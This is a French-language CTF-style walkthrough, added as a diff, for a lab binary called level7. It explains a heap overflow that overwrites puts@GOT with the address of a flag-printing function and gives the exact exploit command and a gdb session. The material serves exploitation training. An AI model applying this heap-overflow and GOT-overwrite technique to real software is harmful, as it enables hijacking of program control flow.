@@ -1,0 +1,73 @@
+# Walkthrough — level7 (flag07)
+
+## 1) Contexte & objectifs
+- Objectif : faire appeler `m` à la place de `puts` pour qu'elle affiche le contenu du flag lu dans `c`.
+- Fichier / binaire : `level7`.
+- Contexte : deux paires de `malloc` + deux `strcpy` permettent d'écraser une entrée de la GOT.
+
+## 2) Analyse & vulnérabilité
+- Analyse statique :
+	- La heap est organisée ainsi au moment des deux `strcpy` :
+	```
+	0x10 [ptr1]       data: { 1, ptr1[1] }
+	0x10 [ptr1[1]]    data: destination argv[1]
+	0x10 [ptr2]       data: { 2, ptr2[1] }
+	0x10 [ptr2[1]]    data: destination argv[2]
+	```
+	- `strcpy((char *)ptr1[1], argv[1])` écrit dans chunk1 sans vérification de taille : débordement possible.
+	- `strcpy((char *)ptr2[1], argv[2])` écrit à l'adresse stockée dans `ptr2[1]`.
+- Analyse dynamique :
+	- En débordant de chunk1 (8 octets de données) on traverse le header de chunk2 (8 octets) puis `ptr2[0]` (4 octets), pour finalement écraser `ptr2[1]` (4 octets) avec n'importe quelle adresse.
+	- Si on y met l'adresse GOT de `puts` (`0x08049928`), le second `strcpy` va écrire argv[2] à cette adresse.
+	- La GOT (Global Offset Table) est la table qui stocke les adresses résolues des fonctions de la libc. En écrasant l'entrée de `puts`, on redirige tous les appels futurs à `puts` vers la fonction de notre choix.
+	- Adresse de `m` (la fonction qui affiche `c`) : `0x080484f4`.
+	- Quand `puts("~~")` s'exécute ensuite, il appelle `m` à la place, qui affiche le flag déjà chargé dans `c`.
+- Vulnérabilité : heap overflow + écrasement d'une entrée GOT (GOT overwrite).
+
+## 3) Exploitation & flag
+- Étapes :
+	- arg1 : 20 octets de padding (8 chunk1 data + 8 header chunk2 + 4 pour ptr2[0]) puis adresse GOT de `puts` (`0x08049928`) (voir la partie gdb pour l'obtention de l'adresse).
+	- arg2 : adresse de `m` (`0x080484f4`).
+	- Le second `strcpy` écrase `puts@GOT` avec l'adresse de `m`.
+	- `puts("~~")` appelle `m`, qui imprime le flag.
+- Commandes utilisées :
+	- `./level7 $(python -c 'print(("A" * 20) + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')`.
+
+## gdb
+
+```sh
+gdb --args ./level7 to u
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/user/level7/level7...(no debugging symbols found)...done.
+(gdb) b main
+Breakpoint 1 at 0x8048524
+(gdb) r
+Starting program: /home/user/level7/level7 to u
+
+Breakpoint 1, 0x08048524 in main ()
+(gdb) disassemble
+Dump of assembler code for function main:
+  ...
+   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
+   0x080485fc <+219>:	mov    $0x0,%eax
+   0x08048601 <+224>:	leave  
+   0x08048602 <+225>:	ret    
+End of assembler dump.
+(gdb) disassemble 0x8048400
+Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:	jmp    *0x8049928
+   0x08048406 <+6>:	push   $0x28
+   0x0804840b <+11>:	jmp    0x80483a0
+End of assembler dump.
+(gdb) x 0x8049928
+0x8049928 <puts@got.plt>:	0x08048406
+(gdb)
+```
